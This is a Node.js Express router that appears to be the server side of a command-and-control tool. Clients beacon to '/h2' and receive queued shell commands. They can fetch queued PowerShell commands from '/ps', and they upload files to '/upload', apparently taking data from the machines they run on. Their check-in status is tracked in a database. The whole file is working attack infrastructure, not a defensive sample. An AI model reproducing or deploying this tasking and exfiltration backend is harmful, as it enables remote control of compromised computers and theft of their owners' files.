const router = require('express').Router();
const Command = require('../commands.model');
const Status = require('../../Status/status.model');
const Utils = require('../../Utils/utilFunctions');
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const psCommand = require('../pscommand.model');
const formidable = require('express-formidable');

router.use(toolCookieValidator);


//Give client a command + update check in
router.route('/h2').get((req, res) => {
    try {
        let clientId = req.headers['clientid'];
        Command.findOneAndDelete({client_id: clientId}, function (err, command) {
            if (err) {
                Utils.LogToFile(`Error getting command for client ${err} from database`);
                res.send("No command");
            } else {
                if (command) {
                    res.send(command['command']);
                } else {
                    res.send("No command");
                }
                //Update status
                Status.findOneAndUpdate({client_id: clientId}, {
                        status: true,
                        lastActive: Utils.GetCurrentTimeDate()
                    }, {useFindAndModify: false},
                    function (err) {
                        if (err) {
                            Utils.LogToFile(`Error updating client ${clientId} status to DB`);
                        } else {

                        }
                    })
            }
        })
    } catch (err) {
        Utils.LogToFile(`Error getting command for client ${err}`);
        res.send("No command");
    }

});


//get a powershell command
router.route('/ps').post((req, res) => {
    try {
        let clientId = req.headers['clientid'];
        psCommand.findOneAndDelete({client_id: clientId}, function (err, command) {
            if (err) {
                Utils.LogToFile(`Error getting ps command for client ${err} from database`);
                res.send("No command");
            } else {
                if (command) {
                    res.send(command['command']);
                } else {
                    res.send("No command");
                }
                //Update status
                Status.findOneAndUpdate({client_id: clientId}, {status: true}, {useFindAndModify: false},
                    function (err) {
                        if (err) {
                            Utils.LogToFile(`Error updating client ${clientId} status to DB`);
                        }
                    })
            }
        })
    } catch (err) {
        Utils.LogToFile(`Error getting ps command for client ${err}`);
        res.status(400).send("No command");
    }
});


router.use(formidable())

router.route('/upload').post((req, res) => {
    Utils.MoveFile(req.files.fileUpload.path, req.files.fileUpload.name, req.headers['clientid'])
    res.send("Done")
})

module.exports = router;
